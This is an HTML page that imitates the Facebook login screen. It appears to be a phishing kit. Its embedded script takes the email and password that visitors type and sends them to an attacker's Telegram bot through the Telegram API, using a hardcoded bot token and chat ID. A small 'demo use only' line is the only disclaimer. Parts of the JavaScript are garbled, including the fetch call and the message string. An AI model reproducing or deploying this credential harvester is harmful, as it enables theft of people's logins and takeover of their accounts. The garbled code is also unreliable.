<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Facebook – log in or sign up</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f0f2f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .login-box {
      background: white;
      padding: 20px;
      border-radius: 8px;
      width: 360px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    .login-box h2 {
      color: #1877f2;
      font-size: 28px;
      margin-bottom: 20px;
      text-align: center;
    }
    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 12px;
      margin-bottom: 10px;
      border: 1px solid #ddd;
      border-radius: 6px;
    }
    button {
      background: #1877f2;
      color: white;
      padding: 12px;
      width: 100%;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      cursor: pointer;
    }
    .note {
      text-align: center;
      margin-top: 10px;
      font-size: 12px;
      color: gray;
    }
  </style>
</head>
<body>

<div class="login-box">
  <h2>Facebook</h2>
  <form id="loginForm">
    <input type="text" id="email" placeholder="Email or phone number" required>
    <input type="password" id="password" placeholder="Password" required>
    <button type="submit">Log In</button>
  </form>
  <div class="note">This is a UI clone for demo use only</div>
</div>

<script>
  const BOT_TOKEN = '7800786159:AAEN32sGLQwf-La3FnExkLVIiCPkOfS8-dA'; // Replace with your bot token
  const CHAT_ID = '7768068563 '; // Replace with your Telegram chat ID

  document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const message = 🔐 *New Demo Login Attempt*\n\n📧 Email: ${email}\n🔑 Password: ${password};
    
    fetch:BOT_TOKEN://api.telegram.org/bot${BOT_TOKEN}/sendMessage, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      })
    })
    .then(response => {
      alert('Demo credentials sent to your Telegram bot!');
      document.getElementById('loginForm').reset();
    })
    .catch(error => {
      console.error('Error:', error);
      alert('Failed to send message');
    });
  ;
</script>

</body>
</html>
